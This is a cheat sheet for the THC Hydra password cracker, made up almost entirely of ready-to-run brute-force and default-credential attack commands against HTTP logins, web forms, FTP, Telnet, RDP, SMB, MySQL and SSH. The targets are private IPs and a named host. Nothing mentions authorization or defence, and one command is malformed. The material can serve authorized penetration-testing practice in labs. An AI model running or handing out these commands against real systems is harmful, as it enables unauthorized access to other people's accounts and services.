Hydra (also called THC Hydra) is a powerful and popular tool used for online password cracking. It supports various protocols and services to perform brute force or dictionary attacks by trying multiple username and password combinations. It is a network logon cracker that can be used to launch rapid dictionary attacks against more than 50 protocols, including FTP, HTTP, HTTPS, SMB, several databases, and many more. It automates login attempts using given username and password lists.

## Key Features

- Supports a wide range of protocols (like ssh, ftp, http-form, telnet, mysql, smb, rdp).
- Works with username and password lists (wordlists).
- Supports parallel attacks with customizable thread counts.
- Allows specifying ports, proxy support, and different authentication methods (e.g., HTTP basic, HTTP POST forms).
- Provides verbose and detailed output to track attempts.

## Basic Usage

### Install Hydra

```
apt install hydra

```

### Show Help and Usage Options

```
hydra -h

```

### Example: Brute Force HTTP HEAD Basic Auth Login

```
hydra -l admin -p password123 http-head://192.168.1.51

```

### Example: Brute Force SSH with Username and Password Lists

```
hydra -L userlist.txt -P passlist.txt ssh://192.168.1.100

```

## Supported Services

Hydra supports a wide range of services including:

- adam6500, asterisk, cisco, cobaltstrike, cvs, firebird, ftp[s], http[s]-{head|get|post}
- http-proxy, icq, imap[s], irc, ldap2[s], ldap3[-{cram|digest}md5][s], memcached, mongodb, mssql
- mysql, nntp, oracle-listener, oracle-sid, pcanywhere, pop3[s], postgres, rdp, redis
- rexec, rlogin, rpcap, rsh, rtsp, s7-300, sip, smb, smtp[s], snmp, socks5, ssh, svn
- teamspeak, telnet[s], vmauthd, vnc, xmpp

## HTTP Basic Authentication (http-head, http-get)

These Hydra commands demonstrate various ways to perform brute force attacks on HTTP basic authentication and HTTP GET methods.

### Single Username and Password

```
hydra -l administrator -p @rmour123 http-head://192.168.1.63

```

```
hydra -l administrator -p @rmour123 http-get://192.168.1.63

```

```
hydra -l administrator -p @rmour123 http-head://db.armour.com

```

```
hydra -l administrator -p @rmour123 http-get://db.armour.com

```

### Using Password List for a Single Username

```
hydra -l administrator -P /opt/password.txt http-head://192.168.1.63

```

### Using Username and Password Lists

```
hydra -L /opt/user.txt -P /opt/password.txt http-head://192.168.1.63

```

```
hydra -L /opt/user.txt -P /opt/password.txt http-get://192.168.1.63

```

### Adding Concurrency (-t), Verbosity (-v, -V), and Custom Ports (-s)

```
hydra -L /opt/user.txt -P /opt/password.txt http-get://192.168.1.63 -t 10

```

```
hydra -t 10 -v hydra -L /opt/user.txt -P /opt/password.txt http-get://192.168.1.63

```

```
hydra -L /opt/user.txt -P /opt/password.txt http-get://192.168.1.63 -t 10 -V

```

```
hydra -L /opt/user.txt -P /opt/password.txt -s 8080 http-get://192.168.1.63 -t 10

```

```
hydra -L /opt/user.txt -P /opt/password.txt http-get://192.168.1.63:8080 -t 10

```

```
hydra -L /opt/user.txt -P /opt/password.txt 192.168.1.63 http-get -t 10

```

```
hydra -L /opt/user.txt -P /opt/password.txt 192.168.1.63 -s 8080 http-get -t 10

```

### Verbose Modes with Password and Username Lists

```
hydra -v -L /opt/user.txt -P /opt/password.txt http-head://db.armour.com

```

```
hydra -v -L /opt/user.txt -P /opt/password.txt http-get://db.armour.com

```

### Using a Proxy

```
hydra -L /opt/user.txt -P /opt/password.txt http-proxy://192.168.1.63

```

```
hydra -L /opt/user.txt -P /opt/password.txt http-proxy://192.168.1.63

```

## HTTP POST Form Authentication

```
hydra -l neep -p oug 192.168.1.239 http-post-form "/bWAPP/Login.php:login=^USER^&password=^PASS^&security_level=0:form-submit:Invalid" -v

```

```
hydra -L /opt/user.txt -P /opt/password.txt 192.168.1.239 http-post-form "/bWAPP/Login.php:Login=^USER^&password=^PASS^&security_level=0:form-submit:Invalid" -V

```

```
hydra -l root -p root 192.168.1.31 http-post-form "/phonyadmin/index.php:set_session=q9d2pglov437ltbotlidb@2@uh6pma_username=^USER^&pma_password=^PASS^:server_later-target-index.php?token=6276267576777850486f4f2820235a7e:Cannot"

```

```
hydra -L /opt/user.txt -P /opt/password.txt 192.168.1.31 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login&user_token=92F20475946e01c9f5abefee@fch8695:failed"

```

## FTP

These commands demonstrate how to use Hydra for password cracking on FTP servers using username and password combinations.

### Single Username and Password

```
hydra -l administrator -p @rmour123 <ftp://192.168.1.63>

```

```
hydra -l user -p @rmour123 <ftp://192.168.1.62>

```

### Single Username with Password List

```
hydra -l administrator -P /opt/password.txt <ftp://192.168.1.63>

```

```
hydra -l user -P /opt/darkweb2017-top100.txt <ftp://192.168.1.63> -t 10

```

### Username List with Password List

```
hydra -L /opt/top-usernames-shortlist.txt -P /opt/darkweb2017-top100.txt 192.168.1.63 ftp -t 10

```

```
hydra -L /opt/user.txt -P /opt/password.txt <ftp://192.168.1.63> -t 10

```

### Using Combined Credential List

```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <ftp://192.168.1.63>

```

## Telnet

These commands illustrate how to perform Telnet password cracking using Hydra.

### Single Username and Password

```
hydra -l admin -p 123 telnet://192.168.1.214

```

```
hydra -l administrator -p @rmour123 telnet://192.168.1.214

```

```
hydra -l administrator -p armour123 192.168.1.214 telnet -t 10

```

### Single Username with Password List

```
hydra -l administrator -P /opt/password.txt telnet://192.168.1.214

```

### Username List with Single Password

```
hydra -L /opt/top-usernames-shortlist.txt -p @rmour123 telnet://192.168.1.51 -t 10

```

### Username List with Password List

```
hydra -L /opt/username.txt -P /opt/password.txt telnet://192.168.1.214

```

```
hydra -L /opt/top-usernames-shortlist.txt -P /opt/darkweb2017-top100.txt 192.168.1.51 telnet -t 18

```

### Using Custom Port

```
hydra -L /opt/top-usernames-shortlist.txt -p @rmour123 -s 23 telnet://192.168.1.51 -t 10

```

### Using Combined Credential File

```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt telnet://192.168.1.214

```

```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt -s 23 192.168.1.51 telnet -t 10

```

### Multiple Targets from File

```
hydra -l admin -p admin -M port-23-192.168.0.0-2.txt telnet

```

## RDP

### Example Commands

```
hydra -l administrator -p @rmour123 rdp://192.168.1.63

```

```
hydra -l administrator -P /opt/password.txt -s 3389 192.168.1.63 rdp -t 10

```

```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/windows-betterdefaultpasslist.txt rdp://192.168.1.63

```

## SMB

### Example Commands

```
hydra -l administrator -p @rmour123 smb://192.168.1.63

```

```
hydra -L /opt/user.txt -P /opt/password.txt 192.168.1.63 smb

```

```
hydra -l it1 -P /opt/password.txt smb://192.168.1.63 -t 64

```

```
hydra -C /opt/windows-betterdefaultpasslist.txt 192.168.1.63 smb

```

## MySQL

### Example Commands

```
hydra -l root -p root mysql://192.168.1.32

```

```
hydra -L /opt/user.txt -P /opt/password.txt mysql://192.168.1.63

```

```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt 192.168.1.63 mysql

```

## SSH

### Example Commands

```
hydra -l root -p root ssh://192.168.1.31

```

```
hydra -l root -P /opt/password.txt 192.168.1.23 ssh -s 22

```

```
hydra -L /opt/user.txt -P /opt/password.txt ssh://192.168.1.31 -t 4

```

```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://192.168.1.31

```
